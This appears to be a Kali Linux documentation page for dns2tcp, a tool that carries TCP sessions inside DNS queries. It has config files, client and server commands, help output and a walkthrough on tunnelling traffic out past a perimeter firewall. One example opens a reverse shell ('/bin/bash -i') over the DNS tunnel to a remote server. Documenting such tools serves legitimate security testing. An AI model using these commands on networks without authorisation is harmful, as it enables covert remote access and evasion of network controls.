Tool Documentation
===============================================================================
*** Packages & Binaries ***
    * dns2tcp
          o dns2tcpc
          o dns2tcpd
===============================================================================
****** Tool Documentation: ******
***** dns2tcpd Usage Example *****
:~$ cat >>.dns2tcpdrc <<END
listen = 0.0.0.0
port = 53
user=nobody
chroot = /root/dns2tcp
pid_file = /var/run/dns2tcp.pid
domain = dns2tcp.kali.org
key = secretkey
resources = ssh:127.0.0.1:22
END

:~$ dns2tcpd -f .dns2tcpdrc
:~$

***** dns2tcpc Usage Example *****
:~$ cat >>.dns2tcprc <<END
domain = dns2tcp.kali.org
resource = ssh
local_port = 2139
key = secretkey
END

:~$ dns2tcpc -f .dns2tcprc
:~$ ssh root@localhost -p 2139 -D 8090
The authenticity of host '[localhost]:2139 ([127.0.0.1]:2139)' can't be
established.
ECDSA key fingerprint is aa:bb:1f:cc:f1:ab:7c:71:9b:62:37:8c:f1:60:2e:98.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[localhost]:2139' (ECDSA) to the list of known
hosts.
root@localhost's password:
Linux flw 3.12-kali1-amd64 #1 SMP Debian 3.12.6-2kali1 (2014-01-06) x86_64
Last login: Tue May  6 22:54:15 2014 from beast.fritz.box
:~$

dns2tcpc -k mykey -z dns2tcp.hsc.fr mydns

Ask the dns2tcp server to list available resources.

       ssh -o 'ProxyCommand dns2tcpc -r ssh -l - -z dns2tcp.hsc.fr -k mykey mydns' myserver

Use dns2tcp as a proxy command with ssh. We try to connect to the ssh resource with
the key 'mykey' and the DNS mydns.

       dns2tcpc -r socat-resource -e '/bin/bash -i' -k mykey -z dns2tcp.hsc.fr mydns

Use dns2tcp as a reverse shell, the remote shell will appear on the socat-resource.

       dns2tcpc -d 1 -f /dev/null -r ssl-tunnel -l 2000 -k mykey  -T KEY -z dns2tcp.hsc.fr mydns

Do not use the default configuration file, bind local port 2000 and forward all the
traffic on the remote ssl-tunnel resource, use the first debug level. Use KEY  type
DNS requests.

***** dns2tcpc Example Details *****
In this case we are going to tunnel some traffic from a client behind a
perimeter firewall to our own server. Since dns2tcp is using dns (asking for
TXT records within a (sub)domain) to archive the goal we need to create a NS
record for a new subdomain pointing to the address of our server.
dns2tcp.kali.org. IN NS lab.kali.org.
There is no need for a DNS server installation. But please keep in mind that
you probably added a new NS to a real DNS zone. And it might take a while until
the new subdomain is “active”.
In the next step (dns2tcpd Usage Example) we create a configuration file on our
server (lab.kali.org) and start the daemon. To make sure everything is working
well you should consider using the options “-F” (Run in foreground) and “-d 1”
(debugging) at the first start.
Now you can configure the host (dns2tcpc Usage Example) and run the client part
of the tool. The tunnel is established now and you can connect to your remote
box with ssh (ssh [email protected] -p 2139 -D 8090). Please keep in mind to
use the username of the remote box (lab.kali.org) because the connection goes
to port 2139 (-p 2139). The traffic to this port gets tunneled via DNS (because
the dns2tcp client is listening on this port) to your remote server (where your
dns2tcp server is waiting on port 53 for incoming connections). While
connecting to the remote box via ssh you have also created an additional
listener with your ssh command (-D 8090). This port can be used as SOCKS proxy
and the traffic will also be tunneld to your remote box.
===============================================================================

****** Packages and Binaries: ******
**** dns2tcp ****
dns2tcp is a set of tools to encapsulate a TCP session in DNS packets. This
type of encapsulation generates smaller packets than IP-over-DNS, improving
throughput. The client does not need root privileges.1
Installed size: 152 KB
How to install: sudo apt install dns2tcp
Dependencies:
    * init-system-helpers
    * libc6
    * lsb-base
** dns2tcpc **
A tunneling tool that encapsulate TCP traffic over DNS.

:~$ dns2tcpc -h
dns2tcpc: option requires an argument -- 'h'
dns2tcp v0.5.2 ( http://www.hsc.fr/ )
Usage : dns2tcpc [options] [server]
        -c              : enable compression
        -z <domain>     : domain to use (mandatory)
        -d <1|2|3>      : debug_level (1, 2 or 3)
        -r <resource>   : resource to access
        -k <key>        : pre-shared key
        -f <filename>   : configuration file
        -l <port|->     : local port to bind, '-' is for stdin (mandatory if resource
defined without program )
        -e <program>    : program to execute
        -t <delay>      : max DNS server's answer delay in seconds (default is 3)
        -T <TXT|KEY>    : DNS request type (default is TXT)
        server  : DNS server to use
        If no resources are specified, available resources will be printed
===============================================================================

** dns2tcpd **
A tunneling tool that encapsulate TCP traffic over DNS.
:~$ dns2tcpd --help
dns2tcpd: invalid option -- '-'
Usage : dns2tcpd [ -i IP ] [ -F ] [ -d debug_level ] [ -f config-file ] [ -
p pidfile ]
         -F : dns2tcpd will run in foreground
===============================================================================
Updated on: 2022-Aug-05
===============================================================================
